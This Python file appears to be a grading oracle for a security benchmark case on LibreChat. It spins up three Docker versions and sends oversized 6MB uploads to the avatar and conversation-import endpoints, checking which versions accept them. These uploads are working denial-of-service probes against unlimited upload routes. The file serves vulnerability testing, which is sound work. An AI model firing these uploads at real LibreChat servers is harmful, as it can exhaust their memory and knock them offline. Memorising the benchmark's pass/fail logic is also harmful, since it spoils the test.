#!/usr/bin/env python3
"""Flag differential oracle for librechat-cve-2026-54024.

Chain: CVE-2024-11171 (unlimited in-memory multer upload -> OOM DoS, fixed 0.7.6 by
       bb58a2d0: multer disk storage + filterFile/limits on avatar & file endpoints)
     -> CVE-2026-54024 (the /api/convos/import multipart route kept an UNLIMITED
        multer upload; fixed 0.8.4-rc1: limits:{fileSize} + 413 handler).

V0 = LibreChat v0.7.5  (avatar upload = in-memory multer, NO size limits)
V1 = LibreChat v0.7.6  (avatar upload now limited by filterFile (avatarSizeLimit);
                        import route STILL unlimited)                <- target
V2 = LibreChat v0.8.4-rc1 (import route limited: 413 on LIMIT_FILE_SIZE)

DoS-threshold gate (Variant C), no flag token needed:
  seed:    POST /api/files/images/avatar with a 6MB PNG
           -> V0: 200 {url} (accepted),  V1: 500 (rejected)
  residual: POST /api/convos/import with a 6MB JSON export
           -> V1: 201 (accepted),  V2: 413 (rejected)
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import tempfile
from pathlib import Path

import requests

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import librechat_util as u  # noqa: E402

CASE = "librechat-cve-2026-54024"
FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
AVATAR_MB = 6
IMPORT_MB = 6


def _probe_files(tmp: str):
    png = os.path.join(tmp, "big.png")
    jso = os.path.join(tmp, "big.json")
    u.make_png(png, raw_extra=AVATAR_MB * 1024 * 1024)
    u.make_import_json(jso, IMPORT_MB * 1024 * 1024)
    return png, jso


BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)


def _avatar_upload(base: str, png: str, field: str) -> dict:
    """Multipart POST /api/files/images/avatar. The multipart field name changed with the
    CVE-2024-11171 fix: v0.7.5 uses its own memory multer with field 'input';
    v0.7.6+ the files router parses field 'file' (disk multer + filterFile limits).
    A browser UA is required by the uaParser middleware on /files routes."""
    lr = u.ensure_user(base)
    if "token" not in lr:
        return {"status": 0, "body": lr.get("error", "login failed")}
    h = {"Authorization": f"Bearer {lr['token']}", "User-Agent": BROWSER_UA}
    with open(png, "rb") as f:
        blob = f.read()
    r = requests.post(
        base + "/api/files/images/avatar",
        headers=h,
        files=[(field, ("big.png", blob, "image/png"))],
        timeout=180,
    )
    return {"status": r.status_code, "body": r.text[:300]}


def _import_upload(base: str, jso: str) -> dict:
    lr = u.ensure_user(base)
    if "token" not in lr:
        return {"status": 0, "body": lr.get("error", "login failed")}
    h = {"Authorization": f"Bearer {lr['token']}"}
    with open(jso, "rb") as f:
        blob = f.read()
    r = requests.post(
        base + "/api/convos/import",
        headers=h,
        files=[("file", ("big.json", blob, "application/json"))],
        timeout=180,
    )
    return {"status": r.status_code, "body": r.text[:300]}


def seed_exploit(*, version="v0") -> dict:
    if not u.wait_ready(u.BASE[CASE][version]):
        return {"ok": False, "status": 0, "body": "env not ready"}
    field = "input" if version == "v0" else "file"
    with tempfile.TemporaryDirectory() as tmp:
        png, _ = _probe_files(tmp)
        r = _avatar_upload(u.BASE[CASE][version], png, field)
    r["ok"] = r["status"] == 200 and '"url"' in r["body"]
    return r


def residual_exploit(*, version="v1") -> dict:
    if not u.wait_ready(u.BASE[CASE][version]):
        return {"ok": False, "status": 0, "body": "env not ready"}
    with tempfile.TemporaryDirectory() as tmp:
        _, jso = _probe_files(tmp)
        r = _import_upload(u.BASE[CASE][version], jso)
    r["ok"] = r["status"] == 201
    return r


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0_status": s0["status"],
        "seed_v1_status": s1["status"],
        "residual_v1_status": r1["status"],
        "residual_v2_status": r2["status"],
        "seed_v0_body": s0["body"][:120],
        "seed_v1_body": s1["body"][:120],
        "residual_v1_body": r1["body"][:120],
        "residual_v2_body": r2["body"][:120],
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2500:]}
    result = gate()
    result["_env_ready"] = {
        v: u.wait_ready(u.BASE[CASE][v], timeout=60) for v in profiles
    }
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
